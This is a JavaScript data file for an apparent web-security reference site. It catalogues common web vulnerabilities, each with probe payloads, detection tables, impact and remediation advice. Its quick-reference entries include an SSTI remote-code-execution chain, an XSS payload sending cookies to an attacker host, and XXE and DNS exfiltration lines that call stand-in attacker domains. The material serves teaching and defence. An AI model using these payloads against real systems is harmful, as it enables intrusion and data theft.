/*
  VULNS -- the data behind /vulns.html and /vuln-detail.html.

  A categorized field reference of common vulnerabilities and
  misconfigurations. Same shape as toolkit.js so the same rendering,
  search, and detail-page machinery works.

  {
    id:          "unique-slug",   // powers vuln-detail.html?vuln=<id>
    name:        "Vulnerability Name",
    severity:    "Critical|High|Medium|Low|Info",
    ref:         "https://...",   // optional external reference (button)
    theory:      "theory/....html",// optional link to a deep theory page (button)
    description: "One line for the grid card.",
    brief:       "Overview paragraph(s). Use \n\n between paragraphs.",
    quickReference: [ { label: "...", cmd: "payload or indicator" } ],
    sections: [ {title,type:"table",columns,rows} | {type:"commands",commands} | {type:"notes",items} ]
  }

  HOW TO ADD: drop a new object into the right category's `vulns` array,
  or add a new { category, vulns:[...] } block. Save and refresh.
*/

var VULNS = [
  {
    category: "Injection",
    vulns: [
      {
        id: "sqli",
        name: "SQL Injection (SQLi)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/sql-injection",
        description: "User input reaches a SQL query unsanitized, letting an attacker read, modify, or destroy database data — and sometimes reach the OS.",
        brief: "SQL injection happens when user-controlled input is concatenated into a SQL query instead of being passed as a bound parameter. The database cannot tell the attacker's data from the developer's code, so a crafted value changes the query's meaning — dumping other users' rows, bypassing authentication, or, with enough privilege, reading files and running commands on the database host.\n\nIt is one of the oldest and most serious web vulnerabilities, and it remains common wherever queries are built by string concatenation. Detection, confirmation, and exploitation are heavily automated by sqlmap, but understanding the manual technique is what lets you find and confirm it reliably.",
        quickReference: [
          { label: "Break the query (error/boolean probe)", cmd: "' OR '1'='1     '--     ' OR 1=1-- -" },
          { label: "UNION-based column count", cmd: "' ORDER BY 5-- -     ' UNION SELECT NULL,NULL,NULL-- -" },
          { label: "Time-based blind confirmation", cmd: "'; IF(1=1) WAITFOR DELAY '0:0:5'--   (MSSQL)\n' AND SLEEP(5)-- -   (MySQL)" },
          { label: "Automate with sqlmap", cmd: "sqlmap -r request.txt --batch --dbs" }
        ],
        sections: [
          {
            title: "Injection Types",
            type: "table",
            columns: ["Type", "How it manifests"],
            rows: [
              ["In-band (UNION)", "Results are returned in the response — extract data directly via UNION SELECT"],
              ["Error-based", "The DB error message leaks data when the query breaks"],
              ["Boolean blind", "No data or errors; a true/false condition changes the response subtly"],
              ["Time blind", "No visible difference; infer true/false from a deliberate SLEEP/WAITFOR delay"],
              ["Stacked queries", "A second statement runs after a semicolon — enables writes and, sometimes, OS commands"],
              ["Second-order", "Input is stored, then used unsafely in a later query elsewhere in the app"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Signal", "What to test"],
            rows: [
              ["Any parameter in a query", "IDs, filters, search, sort columns, and JSON/body fields — not just the URL"],
              ["Single quote breaks it", "Appending ' causes a 500, a different response, or a SQL error"],
              ["Arithmetic reflects", "id=2-1 returning the same as id=1 suggests server-side evaluation"],
              ["Boolean pairs differ", "' AND 1=1-- vs ' AND 1=2-- produce different responses"],
              ["ORDER BY probing", "Increasing ORDER BY n until it errors reveals the column count"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Data theft", "Dump users, credentials, PII, payment data — often the whole database"],
              ["Authentication bypass", "' OR 1=1-- in a login turns the check always-true"],
              ["Data tampering / destruction", "UPDATE/DELETE via stacked queries"],
              ["File read/write", "LOAD_FILE / INTO OUTFILE (MySQL), reading config or writing a webshell"],
              ["Remote code execution", "xp_cmdshell (MSSQL) or UDF/COPY TO PROGRAM (Postgres) with high privilege"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use parameterised queries / prepared statements everywhere — this is the single fix that actually works. Never build SQL by string concatenation.",
              "Use an ORM correctly; but beware raw-query escape hatches, which reintroduce the bug.",
              "Apply least privilege to the DB account: no FILE, no xp_cmdshell, no DBA — so a bug is not automatically RCE.",
              "Allow-list where structure is dynamic (e.g. ORDER BY column names) — parameters cannot bind identifiers.",
              "Input validation and a WAF are defense-in-depth, not a substitute for parameterisation."
            ]
          }
        ]
      },
      {
        id: "nosqli",
        name: "NoSQL Injection",
        severity: "High",
        ref: "https://portswigger.net/web-security/nosql-injection",
        description: "Operator or JavaScript injection into a NoSQL query (typically MongoDB), enabling auth bypass and data extraction.",
        brief: "NoSQL databases do not use SQL, but they are still injectable. When user input is placed into a query object without sanitising query operators, an attacker can smuggle in operators like $ne, $gt, or $regex to change the query's logic — most famously turning a login check into one that is always true.\n\nIt is common precisely because developers who have learned to parameterise SQL often assume NoSQL is immune. It is not: the injection is into the structure of the query object, and frameworks that parse bracket or JSON notation into nested objects hand the attacker exactly that structure.",
        quickReference: [
          { label: "Auth bypass (JSON body)", cmd: "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}" },
          { label: "Auth bypass (form / URL)", cmd: "user[$ne]=x&pass[$ne]=x" },
          { label: "Blind extraction with regex", cmd: "pass[$regex]=^a   pass[$regex]=^b  ...  (walk each char)" },
          { label: "Server-side JS injection", cmd: "$where: \"this.pass == this.pass\"   // always true" }
        ],
        sections: [
          {
            title: "Operators Abused",
            type: "table",
            columns: ["Operator", "Effect"],
            rows: [
              ["$ne", "Not equal — 'password not equal to x' is true for any real password"],
              ["$gt / $lt", "Greater/less than — another always-true trick"],
              ["$regex", "Pattern match — extract a value one character at a time (blind)"],
              ["$where", "Evaluate a JavaScript expression server-side — path to code execution"],
              ["$in / $exists", "Match any value in a list / test whether a field exists"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Test", "Indicator"],
            rows: [
              ["Send an operator object", "{\"$ne\":null} in place of a string logs you in or changes results"],
              ["Bracket notation", "param[$ne]=x works because Express/PHP parse it into a nested object"],
              ["Break the query", "Injecting ' or \" or a stray } causes a different error than SQL would"],
              ["Boolean regex", "pass[$regex]=^a vs ^z produce different responses on a real value"],
              ["Tooling", "nosqli scan confirms injectable parameters and the working operator"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Authentication bypass", "The canonical one-request win against a NoSQL login"],
              ["Data extraction", "Blind $regex extraction of passwords and secrets, character by character"],
              ["Query logic tampering", "Return records you should not see, or all records"],
              ["Code execution", "$where / mapReduce evaluate server-side JavaScript"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Validate input types strictly — expect a string where a string belongs, and reject objects/arrays that arrive where a scalar is expected.",
              "Cast user input to the expected type before it reaches the query; a password should never be allowed to be an object.",
              "Disable server-side JavaScript ($where, mapReduce) in MongoDB unless genuinely required.",
              "Use the database driver's query builders rather than passing raw user-controlled objects into queries.",
              "Never expose an unauthenticated MongoDB to the network — a bound-to-0.0.0.0 instance is a direct-dump risk regardless of injection."
            ]
          }
        ]
      },
      {
        id: "command-injection",
        name: "OS Command Injection",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/os-command-injection",
        description: "User input reaches a system shell command, letting an attacker run arbitrary commands on the server.",
        brief: "Command injection occurs when an application builds an operating-system command using unsanitised user input and passes it to a shell. Shell metacharacters (;, |, &, `, $()) let the attacker append or substitute their own commands, which run with the privileges of the web process — direct code execution on the host.\n\nIt is high severity by nature and shows up wherever an app shells out: ping/traceroute tools, file converters, image/PDF processors, backup and export features, and any 'run diagnostics' button.",
        quickReference: [
          { label: "Separators to chain a command", cmd: "; id     | id     & id     && id     %0a id" },
          { label: "Inline substitution", cmd: "$(id)     `id`" },
          { label: "Blind confirmation (OOB)", cmd: "; nslookup $(whoami).attacker.oastify.com" },
          { label: "Blind time-based", cmd: "; ping -c 5 127.0.0.1     ; sleep 5" }
        ],
        sections: [
          {
            title: "Injection Contexts",
            type: "table",
            columns: ["Context", "Break-out"],
            rows: [
              ["Unquoted argument", "Any separator works: ; | & && ||"],
              ["Inside double quotes", "$(cmd) and `cmd` still execute; \" to break out"],
              ["Inside single quotes", "Close the quote first: ' then the payload"],
              ["Newline-sensitive parsers", "%0a (newline) injects a new command line"],
              ["Argument injection", "Even without a separator, extra flags (e.g. -o) can change behaviour dangerously"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Signal", "Approach"],
            rows: [
              ["Shell-adjacent features", "ping, nslookup, whois, convert, zip/tar, pdf/image tools, git operations"],
              ["Results-based", "Append ; id and look for command output in the response"],
              ["Blind time-based", "Inject a sleep/ping and measure the response delay"],
              ["Blind out-of-band", "Trigger a DNS/HTTP callback to a Collaborator/OAST host"],
              ["Tooling", "Commix automates detection and exploitation across these techniques"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Remote code execution", "Arbitrary commands as the web process user"],
              ["Full host compromise", "Read secrets, pivot internally, add persistence"],
              ["Data exfiltration", "Read files, dump env vars and cloud metadata"],
              ["Lateral movement", "Reach internal services from the compromised host"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Avoid calling the shell entirely — use language APIs (e.g. a DNS library instead of shelling out to nslookup).",
              "If you must run a binary, use an exec form that passes arguments as an array (execve-style), never a single shell string.",
              "Never pass user input as part of the command; where a value must be passed, validate against a strict allow-list.",
              "Run the web process with least privilege so a foothold is contained.",
              "A WAF may block obvious payloads but is trivially bypassed — fix the code, do not rely on filtering."
            ]
          }
        ]
      },
      {
        id: "ssti",
        name: "Server-Side Template Injection (SSTI)",
        severity: "Critical",
        ref: "https://portswigger.net/web-security/server-side-template-injection",
        description: "User input is evaluated by a server-side template engine, often escalating to remote code execution.",
        brief: "SSTI happens when user input is embedded into a template that is then rendered server-side, so the input is interpreted as template code rather than data. Because template engines are small language interpreters, this usually escalates from information disclosure to full command execution via documented sandbox escapes.\n\nIt is increasingly common as applications build emails, pages, and documents from templates with user-controlled fields (names, subjects, profile data). The tell is simple: a math expression in the template syntax gets evaluated.",
        quickReference: [
          { label: "Detection probes", cmd: "{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {7*7}   -> look for 49" },
          { label: "Polyglot probe", cmd: "${{<%[%'\"}}%\\" },
          { label: "Jinja2 RCE (concept)", cmd: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
          { label: "Automate", cmd: "python3 sstimap.py -u \"https://target/page?name=x\" --os-shell" }
        ],
        sections: [
          {
            title: "Engine Fingerprint",
            type: "table",
            columns: ["Rendered probe", "Likely engine"],
            rows: [
              ["{{7*7}} -> 49", "Jinja2 (Python), Twig (PHP)"],
              ["${7*7} -> 49", "Freemarker, Velocity (Java)"],
              ["<%= 7*7 %> -> 49", "ERB (Ruby)"],
              ["#{7*7} -> 49", "Some Ruby / Thymeleaf variants"],
              ["{7*7} -> 49", "Smarty (PHP)"],
              ["{{7*'7'}} -> 7777777", "Distinguishes Jinja2 (repeats) from Twig (49)"]
            ]
          },
          {
            title: "Why It Escalates to RCE",
            type: "table",
            columns: ["Mechanism", "Detail"],
            rows: [
              ["Templates run code", "The engine evaluates expressions server-side"],
              ["Sandbox escape", "Jinja2/Twig escapes reach language internals (os, Runtime) then a shell"],
              ["Built-in exec", "Freemarker/Velocity expose classes that run OS commands directly"],
              ["Minimum impact", "Even without RCE, SSTI leaks config, environment, and internal objects"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Reflect a math probe", "Any field echoed back — names, subjects, profile fields, error messages"],
              ["Confirm evaluation", "49 (not '7*7') means server-side evaluation, not plain reflection"],
              ["Distinguish from XSS", "XSS reflects your markup; SSTI computes your expression"],
              ["Identify engine", "Use the fingerprint table, then apply that engine's escape chain"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never pass user input into the template string itself; pass it as rendering data/context, which the engine treats as inert values.",
              "Use a logic-less or sandboxed template engine where possible, and keep the sandbox enabled.",
              "Validate and allow-list any input that must influence template selection.",
              "Treat confirmed SSTI as potential RCE and prioritise accordingly; stop exploitation at a benign proof (id) unless in scope.",
              "Keep template engines updated — sandbox-escape bypasses are patched over time."
            ]
          }
        ]
      },
      {
        id: "xxe",
        name: "XML External Entity (XXE)",
        severity: "High",
        ref: "https://portswigger.net/web-security/xxe",
        description: "An XML parser processes attacker-defined external entities, enabling file read, SSRF, and sometimes RCE.",
        brief: "XXE arises when an application parses XML that permits external entity definitions and does not disable them. An attacker defines an entity that points at a local file or an internal URL; when the parser expands it, the contents are pulled into the response or sent to a server the attacker controls.\n\nIt turns an XML input — SOAP, SAML, document uploads (DOCX/SVG/XML), or any XML API — into a file-read and SSRF primitive, and in some parser configurations into denial of service or code execution.",
        quickReference: [
          { label: "Classic file read", cmd: "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>\n<r>&x;</r>" },
          { label: "SSRF via entity", cmd: "<!ENTITY x SYSTEM \"http://169.254.169.254/latest/meta-data/\">" },
          { label: "Blind / OOB exfiltration", cmd: "<!ENTITY % x SYSTEM \"http://attacker/evil.dtd\">  (external DTD chains the leak)" },
          { label: "Where to inject", cmd: "Any XML body, file upload (SVG/DOCX/XLSX), SAML, SOAP" }
        ],
        sections: [
          {
            title: "Variants",
            type: "table",
            columns: ["Variant", "Description"],
            rows: [
              ["In-band file read", "The entity's contents appear directly in the response"],
              ["Blind (out-of-band)", "No reflection; exfiltrate via an external DTD that sends data to your server"],
              ["Error-based", "Provoke a parser error that embeds the file contents in the error message"],
              ["SSRF", "Point the entity at internal services or cloud metadata endpoints"],
              ["Billion Laughs (DoS)", "Nested entities expand exponentially and exhaust memory"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Signal", "Approach"],
            rows: [
              ["XML anywhere", "Content-Type application/xml, SOAP endpoints, SAML, RSS, config imports"],
              ["File uploads", "Office docs, SVG, and many formats are XML under the hood"],
              ["Reflected entity", "Define a benign entity and see if it expands in the response"],
              ["OOB callback", "Use an external entity pointing to a Collaborator host to catch blind cases"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Local file disclosure", "Read /etc/passwd, source code, config files, keys"],
              ["SSRF", "Reach internal-only services and cloud metadata (credentials)"],
              ["Denial of service", "Entity-expansion attacks crash the parser"],
              ["RCE (rare)", "Via the PHP expect:// wrapper or specific parser features"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Disable external entity and DTD processing in the XML parser — this is the definitive fix, and most libraries expose a single flag for it.",
              "Prefer less complex data formats (JSON) where XML is not required.",
              "Patch and configure the XML library; defaults vary and older versions are often unsafe.",
              "Validate and sanitise uploaded files that are XML-based (SVG, Office documents) before parsing.",
              "Apply least privilege and network egress controls so a successful XXE reads little and reaches nothing internal."
            ]
          }
        ]
      },
      {
        id: "ldap-injection",
        name: "LDAP Injection",
        severity: "High",
        ref: "https://owasp.org/www-community/attacks/LDAP_Injection",
        description: "Unsanitised input in an LDAP filter alters directory queries, enabling auth bypass and information disclosure.",
        brief: "LDAP injection is the directory-service cousin of SQL injection. When an application builds an LDAP search filter from user input without escaping the special filter characters, an attacker can rewrite the filter — bypassing authentication, enumerating directory objects, or extracting attributes they should not see.\n\nIt appears wherever an app authenticates or searches against a directory (corporate logins, address books, user lookups) using string-built filters.",
        quickReference: [
          { label: "Auth bypass (always-true filter)", cmd: "*)(uid=*))(|(uid=*     or simply  *" },
          { label: "Wildcard enumeration", cmd: "admin*     a*     (walk the alphabet to enumerate)" },
          { label: "Blind attribute extraction", cmd: "*)(mail=a*)   vary the pattern, watch the response" },
          { label: "Special chars to escape/abuse", cmd: "( ) * \\ NUL / &  |" }
        ],
        sections: [
          {
            title: "How the Filter Breaks",
            type: "table",
            columns: ["Input", "Effect"],
            rows: [
              ["*", "Wildcard — matches any value, the basis of most LDAP injections"],
              [")(  and  (|", "Close the current clause and inject a new OR condition"],
              ["*)(uid=*))(|(uid=*", "A classic filter break that makes the search always match"],
              ["No escaping", "The app inserts input straight into (&(uid=INPUT)(password=INPUT))"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Signal", "Test"],
            rows: [
              ["Login/lookup forms", "Anything that searches a directory: SSO, address book, admin user search"],
              ["Wildcard behaviour", "A single * returns everyone or logs you in"],
              ["Filter break", "Injecting )( or *)( changes results or causes an LDAP error"],
              ["Boolean/blind", "Vary a wildcard pattern and watch which requests succeed to extract values"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Authentication bypass", "An always-true filter logs in without valid credentials"],
              ["Information disclosure", "Enumerate users, groups, and read attributes character by character"],
              ["Privilege discovery", "Reveal admin accounts and group memberships"],
              ["Directory tampering", "Rare, but possible where write operations build filters unsafely"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Escape all LDAP special characters in user input using the framework's LDAP encoding routine before building a filter.",
              "Use parameterised LDAP APIs / safe filter builders rather than string concatenation.",
              "Bind with least privilege and never build the bind DN or filter from raw input.",
              "Validate input against an allow-list where the format is known (usernames, IDs).",
              "Do not authenticate by searching with a user-supplied password in the filter; use a proper bind operation."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Cross-Site & Client-Side",
    vulns: [
      {
        id: "xss",
        name: "Cross-Site Scripting (XSS)",
        severity: "High",
        ref: "https://portswigger.net/web-security/cross-site-scripting",
        description: "Attacker-controlled script executes in another user's browser, stealing sessions and acting as the victim.",
        brief: "XSS occurs when an application includes untrusted data in a page without correct encoding, so the browser executes it as script. The attacker's JavaScript then runs in the victim's session — reading cookies and tokens, making authenticated requests, keylogging, or rewriting the page.\n\nIt is the most widespread web vulnerability class. The three forms differ in where the injection lives and how it reaches the victim, but the fix is the same principle everywhere: encode on output, in the correct context.",
        quickReference: [
          { label: "Basic reflected probe", cmd: "<script>alert(document.domain)</script>" },
          { label: "Attribute / tag break-out", cmd: "\"><img src=x onerror=alert(1)>     '-alert(1)-'" },
          { label: "Common no-script vectors", cmd: "<svg onload=alert(1)>   <img src=x onerror=alert(1)>   <body onpageshow=alert(1)>" },
          { label: "Session theft (concept)", cmd: "<script>fetch('//attacker/?c='+document.cookie)</script>" }
        ],
        sections: [
          {
            title: "Types",
            type: "table",
            columns: ["Type", "Where it lives"],
            rows: [
              ["Reflected", "Payload is in the request and echoed straight back — delivered via a crafted link"],
              ["Stored", "Payload is saved (comment, profile, message) and fires for every viewer — the most dangerous"],
              ["DOM-based", "Client-side JS writes attacker input into a dangerous sink; the server may never see it"],
              ["Blind", "Stored XSS that fires somewhere you cannot see (admin panel, logs) — catch with an OOB callback"]
            ]
          },
          {
            title: "Context Determines Payload",
            type: "table",
            columns: ["Reflection context", "Break-out"],
            rows: [
              ["HTML body", "Inject a tag: <svg onload=...>, <img onerror=...>"],
              ["HTML attribute", "Close the attribute/tag first: \"> then the tag"],
              ["Inside <script>", "Break the JS string/expression: ';alert(1)//"],
              ["URL / href", "javascript: scheme, or break out of the attribute"],
              ["DOM sink", "innerHTML, document.write, eval, location — trace source to sink"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Inject a unique marker", "Reflect a harmless string, find where and how it appears in the response/DOM"],
              ["Identify the context", "HTML, attribute, script, or DOM — this dictates the payload"],
              ["Test filtered chars", "See which of < > \" ' / are blocked or encoded, then adapt"],
              ["DOM analysis", "Trace user-controlled sources into sinks in the JavaScript (or use DOM Invader / dalfox)"],
              ["Blind XSS", "Plant a callback payload in fields an admin will later view"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Context-aware output encoding is the core fix — HTML-encode in HTML, JS-encode in scripts, URL-encode in URLs. Use the framework's auto-escaping and do not disable it.",
              "Avoid dangerous DOM sinks (innerHTML, document.write, eval); use textContent and safe APIs, or a sanitiser like DOMPurify for rich HTML.",
              "Deploy a strong Content-Security-Policy as defense-in-depth — it limits impact when encoding is missed.",
              "Set HttpOnly on session cookies so script cannot read them, and SameSite to blunt cross-site delivery.",
              "Validate input on the way in, but never rely on input filtering alone — encoding on output is what prevents XSS."
            ]
          }
        ]
      },
      {
        id: "csrf",
        name: "Cross-Site Request Forgery (CSRF)",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/csrf",
        description: "A malicious site causes the victim's browser to send an authenticated state-changing request they never intended.",
        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings without their knowledge.\n\nIt requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is to require an unpredictable, per-request token that a cross-site attacker cannot know.",
        quickReference: [
          { label: "Auto-submitting form (concept)", cmd: "<form action=//target/change-email method=POST>\n <input name=email value=attacker@evil>\n</form><script>document.forms[0].submit()</script>" },
          { label: "Test: remove the token", cmd: "Strip the CSRF token/param — if the action still succeeds, it's vulnerable" },
          { label: "Test: swap the token", cmd: "Use another user's/session's token — if accepted, it isn't bound to the session" },
          { label: "Check", cmd: "Is the action protected only by a cookie? Is SameSite set? Is the token validated?" }
        ],
        sections: [
          {
            title: "Preconditions",
            type: "table",
            columns: ["Condition", "Why it matters"],
            rows: [
              ["Cookie-based session", "The action authenticates via a cookie the browser sends automatically"],
              ["State-changing action", "Something worth forging — email/password change, funds transfer, role change"],
              ["No unpredictable token", "The request has no parameter the attacker cannot guess or obtain"],
              ["Predictable request", "The attacker knows all fields needed to construct the request"]
            ]
          },
          {
            title: "Common Bypasses to Test",
            type: "table",
            columns: ["Weak defence", "Bypass"],
            rows: [
              ["Token not validated", "Remove it entirely and see if the request still works"],
              ["Token not tied to session", "Use a token from another account"],
              ["Token only on POST", "Try the same action as GET"],
              ["Method check only", "Override with X-HTTP-Method-Override or a different verb"],
              ["Referer check", "Suppress the Referer (meta referrer) or match a lax substring check"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Account takeover", "Force an email or password change, then reset"],
              ["Unwanted state change", "Transfer funds, change settings, delete data as the victim"],
              ["Privilege change", "Add an attacker account to a role where the victim is an admin"],
              ["Chained impact", "CSRF a setting that enables a larger attack"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Use anti-CSRF tokens: unpredictable, per-session (or per-request), validated server-side, and bound to the user's session.",
              "Set SameSite=Lax (or Strict) on session cookies — it blocks most cross-site request delivery by default in modern browsers.",
              "For sensitive actions, re-authenticate or require a second factor.",
              "Prefer framework-provided CSRF protection over hand-rolled checks; Referer/Origin checks are a weaker fallback.",
              "Do not rely on custom request headers alone unless you also enforce CORS correctly."
            ]
          }
        ]
      },
      {
        id: "cors-misconfig",
        name: "CORS Misconfiguration",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/cors",
        description: "An over-permissive cross-origin policy lets a malicious site read authenticated responses from the target.",
        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nUnlike CSRF (which can send but not read), a CORS misconfiguration can leak the response body — session-bound data, tokens, and PII — to an attacker-controlled page.",
        quickReference: [
          { label: "The dangerous combo to look for", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
          { label: "Test: reflected origin", cmd: "Send  Origin: https://evil.com  — is it echoed back in ACAO?" },
          { label: "Test: null origin", cmd: "Origin: null  — accepted? Reachable from a sandboxed iframe" },
          { label: "Weak regex", cmd: "Origin: https://target.com.evil.com  or  https://eviltarget.com — does a substring match pass?" }
        ],
        sections: [
          {
            title: "Misconfiguration Patterns",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Reflect Origin + credentials", "Any origin can read authenticated responses — the classic critical case"],
              ["ACAO: null + credentials", "Reachable via sandboxed iframes / data: URLs"],
              ["Wildcard with credentials", "Browsers block ACAO:* with credentials, but broken proxies sometimes allow it"],
              ["Weak origin allow-list", "Substring/suffix checks let target.com.evil.com or eviltarget.com through"],
              ["Trusting all subdomains", "One XSS on any subdomain then reads everything cross-origin"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Send a rogue Origin", "Add Origin: https://evil.com and inspect ACAO/ACAC in the response"],
              ["Check credentials flag", "The impact hinges on Access-Control-Allow-Credentials: true"],
              ["Probe the allow-list logic", "Try null, subdomains, prefix/suffix tricks to find lax matching"],
              ["Confirm data read", "Build a PoC page that fetches with credentials and reads the response"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Sensitive data theft", "Read authenticated API responses — profile, tokens, keys"],
              ["Session/token exfiltration", "Steal CSRF tokens or API keys returned in responses"],
              ["Account actions", "Chain with the leaked token to perform actions as the victim"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Never reflect the Origin header blindly; validate it against a strict server-side allow-list of exact origins.",
              "Only send Access-Control-Allow-Credentials: true when genuinely required, and never together with a wildcard or reflected origin.",
              "Avoid trusting null and avoid loose regex matching — anchor and fully match the origin.",
              "Keep sensitive data out of endpoints that are CORS-enabled where possible.",
              "Do not treat CORS as an access-control mechanism; it governs read access from browsers, not authorization."
            ]
          }
        ]
      },
      {
        id: "clickjacking",
        name: "Clickjacking",
        severity: "Medium",
        ref: "https://portswigger.net/web-security/clickjacking",
        description: "The target page is framed invisibly so the victim's clicks land on it, triggering unintended actions.",
        brief: "Clickjacking (UI redress) loads the target site in a transparent or disguised iframe over attacker-controlled content, so the victim thinks they are interacting with the attacker's page while their clicks actually hit the framed target. Combined with the victim's active session, this drives state-changing actions — enabling a setting, confirming a payment, granting an OAuth scope.\n\nThe defence is to refuse to be framed by untrusted origins, via frame-ancestors CSP or the legacy X-Frame-Options header.",
        quickReference: [
          { label: "Test: can the page be framed?", cmd: "<iframe src=\"https://target.com/sensitive\"></iframe>  — does it render?" },
          { label: "Missing protections", cmd: "No  X-Frame-Options  and no  Content-Security-Policy: frame-ancestors" },
          { label: "Overlay concept", cmd: "Position a transparent iframe (opacity:0) above a decoy button" },
          { label: "Variant", cmd: "Drag-and-drop / cursor-jacking for multi-step actions" }
        ],
        sections: [
          {
            title: "Finding It",
            type: "table",
            columns: ["Check", "Detail"],
            rows: [
              ["Response headers", "Absence of X-Frame-Options and frame-ancestors in CSP"],
              ["Framing test", "Load the page in an iframe from another origin — if it renders, it is framable"],
              ["Sensitive actions", "Identify one-click state changes worth hijacking"],
              ["Frame-buster quality", "Weak JS frame-busting can be defeated with the sandbox attribute"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Outcome", "Detail"],
            rows: [
              ["Unintended actions", "Toggle settings, confirm transactions, grant permissions"],
              ["OAuth/consent hijack", "Trick the victim into approving an authorization prompt"],
              ["Likejacking / follows", "Social actions performed without consent"],
              ["Chained impact", "Enable a weaker setting that opens a larger attack"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set Content-Security-Policy: frame-ancestors 'self' (or an explicit allow-list) — the modern, robust control.",
              "Also set X-Frame-Options: DENY or SAMEORIGIN for older browsers.",
              "Do not rely on JavaScript frame-busting; it is bypassable with the iframe sandbox attribute.",
              "Require an explicit, hard-to-hijack confirmation for the most sensitive actions.",
              "Test the headers on every sensitive page, not just the site root."
            ]
          }
        ]
      },
      {
        id: "prototype-pollution",
        name: "Prototype Pollution",
        severity: "High",
        ref: "https://portswigger.net/web-security/prototype-pollution",
        description: "Injecting into Object.prototype in JavaScript, corrupting application behaviour up to XSS or RCE.",
        brief: "Prototype pollution is a JavaScript-specific flaw where an attacker sets properties on Object.prototype via keys like __proto__ or constructor.prototype. Because nearly every object inherits from that prototype, a polluted property silently appears on objects across the application, changing logic that was never meant to be attacker-influenced.\n\nOn the client it can lead to DOM XSS; on the server (Node.js) it can corrupt config objects and, in the right conditions, reach command execution. It hides in recursive merges, object-path setters, and query-string parsers.",
        quickReference: [
          { label: "Client-side probe", cmd: "?__proto__[test]=polluted   then check  Object.prototype.test  in console" },
          { label: "JSON payload", cmd: "{\"__proto__\": {\"isAdmin\": true}}" },
          { label: "Constructor path", cmd: "constructor[prototype][test]=polluted" },
          { label: "Gadget hunt", cmd: "Find a property the app reads but never sets — pollute it to change behaviour" }
        ],
        sections: [
          {
            title: "Vulnerable Sinks",
            type: "table",
            columns: ["Pattern", "Risk"],
            rows: [
              ["Recursive merge/extend", "merge(target, userInput) that copies __proto__ into the prototype"],
              ["Object path setters", "lodash.set / setValue with an attacker-controlled path"],
              ["Query/JSON parsers", "Parsers that build nested objects from __proto__ keys"],
              ["Deep clone", "Naive clones that carry the polluted property forward"]
            ]
          },
          {
            title: "Impact",
            type: "table",
            columns: ["Environment", "Consequence"],
            rows: [
              ["Client (browser)", "DOM XSS when a polluted property flows into a script gadget (e.g. a sanitiser config)"],
              ["Server (Node)", "Corrupt config/security flags (isAdmin, options), denial of service"],
              ["Server (RCE)", "With the right gadget (e.g. child_process options), escalate to command execution"],
              ["Logic bypass", "Flip a default-false property the app assumes is safe"]
            ]
          },
          {
            title: "Finding It",
            type: "table",
            columns: ["Step", "Detail"],
            rows: [
              ["Pollute a test property", "Send __proto__[x]=y and check whether x appears on unrelated objects"],
              ["Client detection", "DOM Invader (Burp) automates client-side prototype-pollution discovery"],
              ["Find a gadget", "Locate a property the code reads but never assigns — that is the exploit path"],
              ["Server probes", "Look for JSON merge endpoints and config-driven behaviour"]
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Reject or strip __proto__, constructor, and prototype keys in user-supplied objects before merging.",
              "Use Object.create(null) for map-like objects, or a Map, so there is no prototype to pollute.",
              "Use Object.freeze(Object.prototype) as a hardening measure where feasible.",
              "Prefer libraries patched against prototype pollution and keep them updated (many merge/set utilities have advisories).",
